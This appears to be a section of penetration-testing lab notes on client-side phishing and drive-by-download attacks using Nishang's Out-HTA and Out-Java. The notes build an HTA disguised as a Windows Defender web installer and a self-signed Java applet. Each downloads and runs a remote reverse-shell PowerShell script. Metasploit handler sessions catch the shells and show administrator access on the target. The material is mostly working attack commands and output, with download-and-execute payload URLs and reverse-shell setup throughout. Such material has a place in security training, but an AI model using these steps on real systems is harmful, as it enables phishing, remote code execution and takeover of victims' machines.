#### 48. Client Side Attacks Part 3

###### Phishing/Drive-by-download

- Out-HTA
- Out-Java

    - Out-HTA

	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Import-Module .\nishang.psm1
	WARNING: The names of some imported commands from the module 'nishang' include unapproved verbs that might make them less discoverable. To find the commands with unapproved verbs, run the Import-Module
	command again with the Verbose parameter. For a list of approved verbs, type Get-Verb.
	WARNING: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Get-Help Out-HTA -Examples
	
	NAME
	    Out-HTA
	
	SYNOPSIS
	    Nishang script which could be used for generating "infected" HTML Application. It could be deployed on
	    a web server and PowerShell scripts and commands could be executed on the target machine.
	
	    -------------------------- EXAMPLE 1 --------------------------
	
	    PS >Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"
	
	
	    Above command would execute Get-ChildItem on the target machine when the HTA is opened.
	
	
	
	
	    -------------------------- EXAMPLE 2 --------------------------
	
	    PS >Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1
	
	
	    Use above command to generate HTA and VBS files which download and execute the given powershell script in memory on target.
	
	
	
	
	    -------------------------- EXAMPLE 3 --------------------------
	
	    PS >Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM
	
	
	    Use above command to pass an argument to the PowerShell script/module.
	
	
	
	
	    -------------------------- EXAMPLE 4 --------------------------
	
	    PS >Out-HTA -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
	
	
	    Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,
	    you must pass the parameters in the script itself.
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	[```mini-reverse.ps1```](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5)
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Out-HTA -PayloadURL http://10.0.0.233/mini-reverse.ps1
	HTA written to C:\Users\Administrator\Desktop\nishang-master\WindDef_WebInstall.hta.
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> ls .\WindDef_WebInstall.hta
	
	
	    Directory: C:\Users\Administrator\Desktop\nishang-master
	
	
	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	-a---         7/17/2017   3:35 PM       1968 WindDef_WebInstall.hta
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	Run ```WindDef_WebInstall.hta```
	
	```sh
	root@kali:~# msfconsole
	msf > use exploit/multi/handler
	msf exploit(handler) > set PAYLOAD windows/shell/reverse_tcp
	PAYLOAD => windows/shell/reverse_tcp
	msf exploit(handler) > set LHOST 10.0.0.206
	LHOST => 10.0.0.206
	msf exploit(handler) > set LPORT 4444
	LPORT => 4444
	msf exploit(handler) > show options
	
	Module options (exploit/multi/handler):
	 
	    Name  Current Setting  Required  Description
	    ----  ---------------  --------  -----------
	    
	Payload options (windows/shell/reverse_tcp):
	 
	    Name      Current Setting  Required  Description
	    ----      ---------------  --------  -----------
	    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	    LHOST     10.0.0.206       yes       The listen address
	    LPORT     4444             yes       The listen port
	 
	Exploit target:
	 
	    Id  Name
	    --  ----
	    0   Wildcard Target
	 
	
	msf exploit(handler) > exploit
	
	[*] Started reverse TCP handler on 10.0.0.206:4444
	[*] Starting the payload handler...
	[*] Encoded stage with x86/shikata_ga_nai
	[*] Sending encoded stage (267 bytes) to 10.0.0.233
	[*] Command shell session 4 opened (10.0.0.206:4444 -> 10.0.0.233:16894) at 2017-07-17 18:39:08 -0400
	
	whoami
	pfpt\administrator
	```

    - Out-Java

	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Get-Help Out-Java -Examples
	
	NAME
	    Out-Java
	
	SYNOPSIS
	    Nishang script which could be used for generating JAR to be used for applets.
	
	    -------------------------- EXAMPLE 1 --------------------------
	
	    PS >Out-Java -Payload "Get-Process" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
	
	
	    Above command would execute Get-Process on the target machine when the JAR or Class file is executed.
	
	
	
	
	    -------------------------- EXAMPLE 2 --------------------------
	
	    PS >Out-Java -PayloadURL http://192.168.254.1/Get-Information.ps1 -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
	
	
	    Use above command to generate JAR which download and execute the given powershell script in memory on target.
	
	
	
	
	    -------------------------- EXAMPLE 3 --------------------------
	
	    PS >Out-Java -Payload "-e <EncodedScript>" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
	
	
	    Use above command to generate JAR which executes the encoded script.
	    Use Invoke-Command from Nishang to encode the script.
	
	
	
	
	    -------------------------- EXAMPLE 4 --------------------------
	
	    PS >Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
	
	
	    Use above command to pass an argument to the powershell script/module.
	
	
	
	
	    -------------------------- EXAMPLE 5 --------------------------
	
	    PS >Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25" -NoSelfSign
	
	
	    Due to the use of -NoSelfSign in above command, no self signed certificate would be used to sign th JAR.
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	[```mini-reverse.ps1```](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5)
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Out-Java -PayloadURL http://10.0.0.233/mini-reverse.ps1 -JDKPath 'C:\Program Files\Java\jdk1.8.0_131'
	added manifest
	adding: JavaPS.class(in = 1156) (out= 688)(deflated 40%)
	jar signed.
	
	Warning:
	The signer certificate will expire within six months.
	No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate's expiration date (2017-10-15) or after any f
	uture revocation date.
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> ls .\applet.html
	
	
	    Directory: C:\Users\Administrator\Desktop\nishang-master
	
	
	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	-a---         7/17/2017   3:55 PM        253 applet.html
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> ls .\SignedJavaPS.jar
	
	
	    Directory: C:\Users\Administrator\Desktop\nishang-master
	
	
	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	-a---         7/17/2017   3:55 PM       2598 SignedJavaPS.jar
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	Run ```applet.html```
	
	```sh
	root@kali:~# msfconsole
	msf > use exploit/multi/handler
	msf exploit(handler) > set PAYLOAD windows/shell/reverse_tcp
	PAYLOAD => windows/shell/reverse_tcp
	msf exploit(handler) > set LHOST 10.0.0.206
	LHOST => 10.0.0.206
	msf exploit(handler) > set LPORT 4444
	LPORT => 4444
	msf exploit(handler) > show options
	
	Module options (exploit/multi/handler):
	
	   Name  Current Setting  Required  Description
	   ----  ---------------  --------  -----------
	
	
	Payload options (windows/shell/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST     10.0.0.206       yes       The listen address
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Wildcard Target
	
	
	msf exploit(handler) > exploit
	
	[*] Started reverse TCP handler on 10.0.0.206:4444
	[*] Starting the payload handler...
	[*] Encoded stage with x86/shikata_ga_nai
	[*] Sending encoded stage (267 bytes) to 10.0.0.233
	[*] Command shell session 1 opened (10.0.0.206:4444 -> 10.0.0.233:51162) at 2017-07-17 17:13:28 -0400
	
	whoami
	pfpt\administrator
	```
